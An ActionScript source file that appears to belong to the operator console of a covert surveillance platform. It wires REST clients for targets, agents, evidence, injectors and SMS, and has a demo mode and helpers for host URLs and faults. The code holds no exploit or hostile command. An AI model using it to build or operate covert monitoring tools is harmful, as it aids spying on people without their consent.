package it.ht.rcs.console
{
  import it.ht.rcs.console.accounting.rest.DBGroup;
  import it.ht.rcs.console.accounting.rest.DBGroupDemo;
  import it.ht.rcs.console.accounting.rest.DBSession;
  import it.ht.rcs.console.accounting.rest.DBSessionDemo;
  import it.ht.rcs.console.accounting.rest.DBUser;
  import it.ht.rcs.console.accounting.rest.DBUserDemo;
  import it.ht.rcs.console.accounting.rest.IDBGroup;
  import it.ht.rcs.console.accounting.rest.IDBSession;
  import it.ht.rcs.console.accounting.rest.IDBUser;
  import it.ht.rcs.console.agent.rest.DBAgent;
  import it.ht.rcs.console.agent.rest.DBAgentDemo;
  import it.ht.rcs.console.agent.rest.IDBAgent;
  import it.ht.rcs.console.alert.rest.DBAlert;
  import it.ht.rcs.console.alert.rest.DBAlertDemo;
  import it.ht.rcs.console.alert.rest.IDBAlert;
  import it.ht.rcs.console.audit.rest.DBAudit;
  import it.ht.rcs.console.audit.rest.DBAuditDemo;
  import it.ht.rcs.console.audit.rest.IDBAudit;
  import it.ht.rcs.console.backup.rest.DBBackup;
  import it.ht.rcs.console.backup.rest.DBBackupDemo;
  import it.ht.rcs.console.backup.rest.IDBBackup;
  import it.ht.rcs.console.build.rest.DBBuild;
  import it.ht.rcs.console.build.rest.DBBuildDemo;
  import it.ht.rcs.console.build.rest.IDBBuild;
  import it.ht.rcs.console.connector.rest.DBConnector;
  import it.ht.rcs.console.connector.rest.DBConnectorDemo;
  import it.ht.rcs.console.connector.rest.IDBConnector;
  import it.ht.rcs.console.entities.rest.DBEntity;
  import it.ht.rcs.console.entities.rest.DBEntityDemo;
  import it.ht.rcs.console.entities.rest.IDBEntity;
  import it.ht.rcs.console.evidence.rest.DBEvidence;
  import it.ht.rcs.console.evidence.rest.DBEvidenceDemo;
  import it.ht.rcs.console.evidence.rest.IDBEvidence;
  import it.ht.rcs.console.modem.rest.DBModem;
  import it.ht.rcs.console.modem.rest.DBModemDemo;
  import it.ht.rcs.console.modem.rest.IDBModem;
  import it.ht.rcs.console.monitor.rest.DBLicense;
  import it.ht.rcs.console.monitor.rest.DBLicenseDemo;
  import it.ht.rcs.console.monitor.rest.DBMonitor;
  import it.ht.rcs.console.monitor.rest.DBMonitorDemo;
  import it.ht.rcs.console.monitor.rest.IDBLicense;
  import it.ht.rcs.console.monitor.rest.IDBMonitor;
  import it.ht.rcs.console.network.rest.DBCollector;
  import it.ht.rcs.console.network.rest.DBCollectorDemo;
  import it.ht.rcs.console.network.rest.DBInjector;
  import it.ht.rcs.console.network.rest.DBInjectorDemo;
  import it.ht.rcs.console.network.rest.IDBCollector;
  import it.ht.rcs.console.network.rest.IDBInjector;
  import it.ht.rcs.console.operation.rest.DBOperation;
  import it.ht.rcs.console.operation.rest.DBOperationDemo;
  import it.ht.rcs.console.operation.rest.IDBOperation;
  import it.ht.rcs.console.search.rest.DBSearch;
  import it.ht.rcs.console.search.rest.DBSearchDemo;
  import it.ht.rcs.console.search.rest.IDBSearch;
  import it.ht.rcs.console.shard.rest.DBShard;
  import it.ht.rcs.console.shard.rest.DBShardDemo;
  import it.ht.rcs.console.shard.rest.IDBShard;
  import it.ht.rcs.console.sms.rest.DBSms;
  import it.ht.rcs.console.sms.rest.DBSmsDemo;
  import it.ht.rcs.console.sms.rest.IDBSms;
  import it.ht.rcs.console.target.rest.DBTarget;
  import it.ht.rcs.console.target.rest.DBTargetDemo;
  import it.ht.rcs.console.target.rest.IDBTarget;
  import it.ht.rcs.console.task.rest.DBTask;
  import it.ht.rcs.console.task.rest.DBTaskDemo;
  import it.ht.rcs.console.task.rest.IDBTask;
  import it.ht.rcs.console.update.rest.DBUpdate;
  import it.ht.rcs.console.update.rest.DBUpdateDemo;
  import it.ht.rcs.console.update.rest.IDBUpdate;
  
  import mx.rpc.CallResponder;
  import mx.rpc.events.FaultEvent;
  import mx.rpc.events.ResultEvent;
  
  public class DB
  {
    
    public var session:IDBSession;

    public var operation:IDBOperation;
    public var target:IDBTarget;
    public var agent:IDBAgent;
    public var search:IDBSearch;
    
    public var audit:IDBAudit;
    public var task:IDBTask;
    public var collector:IDBCollector;
    public var injector:IDBInjector;
    public var license:IDBLicense;
    public var monitor:IDBMonitor;
    public var user:IDBUser;
    public var group:IDBGroup;
    public var alert:IDBAlert;
    public var update:IDBUpdate;
    public var system:IDBShard;
    public var backup:IDBBackup;
    public var evidence:IDBEvidence;
    public var build:IDBBuild;
    public var connector:IDBConnector;
    public var entity:IDBEntity;
    public var modem:IDBModem;;
    public var sms:IDBSms
    
    
    /* expose if we are in demo mode */
    [Bindable]
    public var demo:Boolean;
    [Bindable]
    public var connected_host:String;
    [Bindable]
    public var connected_port:int;
    
    /* singleton */
    private static var _instance:DB = new DB();
    public static function get instance():DB { return _instance; } 
    
    public static var notifier:IFaultNotifier;
    public static var i18n:II18N;
    
    public function connect(host:String, notifier:IFaultNotifier, i18n:II18N, enable_demo:Boolean=false):void
    {
      DB.notifier = notifier;
      DB.i18n = i18n;
      enable_demo ? initDemo() : initRemote(host);
      demo = enable_demo;
    }
    
    private function initRemote(host:String):void
    {
      /* auto completion of the host entered by the user */
      host = hostAutocomplete(host);
      
      /* remmember the connected_host and port */
      parseHostPort(host);
      
      session   = new DBSession(host);
      
      operation = new DBOperation(host);
      target    = new DBTarget(host);
      agent     = new DBAgent(host);
      search    = new DBSearch(host);
      audit     = new DBAudit(host);
      task      = new DBTask(host);
      collector = new DBCollector(host);
      injector  = new DBInjector(host);
      license   = new DBLicense(host);
      monitor   = new DBMonitor(host);
      user      = new DBUser(host);
      group     = new DBGroup(host);
      alert     = new DBAlert(host);
      update    = new DBUpdate(host);
      system    = new DBShard(host);
      backup    = new DBBackup(host);
      evidence  = new DBEvidence(host);
      build     = new DBBuild(host);
      connector = new DBConnector(host);
      entity    = new DBEntity(host);
      modem     = new DBModem(host);
      sms       = new DBSms(host)
    }
    
    private function initDemo():void
    {
      session   = new DBSessionDemo();
      
      operation = new DBOperationDemo();
      target    = new DBTargetDemo();
      agent     = new DBAgentDemo();
      search    = new DBSearchDemo();
      audit     = new DBAuditDemo();
      task      = new DBTaskDemo();
      collector = new DBCollectorDemo();
      injector  = new DBInjectorDemo();
      license   = new DBLicenseDemo();
      monitor   = new DBMonitorDemo();
      user      = new DBUserDemo();
      group     = new DBGroupDemo();
      alert     = new DBAlertDemo();
      update    = new DBUpdateDemo();
      system    = new DBShardDemo();
      backup    = new DBBackupDemo();
      evidence  = new DBEvidenceDemo();
      build     = new DBBuildDemo();
      connector = new DBConnectorDemo();
      entity    = new DBEntityDemo()
      modem     = new DBModemDemo();
      sms       = new DBSmsDemo();
    }
    
    private function parseHostPort(fqdn:String):void
    {
      var splitted:Array = fqdn.split(':');
      connected_host = splitted[1].replace(/\/\//, '');
      connected_port = parseInt(splitted[2].replace(/\//, ''));
    }
    
    public static function hostAutocomplete(full_address:String):String
    {
      /* if the user doesn't declare the protocol, go with https by default */ 
      if (full_address.search('http') == -1)
        full_address = 'https://' + full_address;
      
      /* if the user doesn't declare a specific port, go with default */ 
      if (full_address.lastIndexOf(':') == full_address.indexOf(':'))
        full_address = full_address + ':443/';
      
      /* always be sure the url ends with '/' */
      if (full_address.lastIndexOf('/') != full_address.length -1)
        full_address = full_address + '/';
      
      return full_address;
    }
    
    public static function getCallResponder(onResult:Function, onFault:Function):CallResponder
    {
      /* set up the responder */
      var resp:CallResponder = new CallResponder();

      if (onResult != null)
        resp.addEventListener(ResultEvent.RESULT, onResult);

      /* if the fault handler is provided, use it. Otherwise, use the default one. */
      if (onFault != null)
        resp.addEventListener(FaultEvent.FAULT, onFault);
      else
        resp.addEventListener(FaultEvent.FAULT, onDeFault);

      return resp;
    }
    
    /* default fault handler */
    private static function onDeFault(e:FaultEvent):void
    {
      if (notifier)
        notifier.fault(e);
    }

  }

}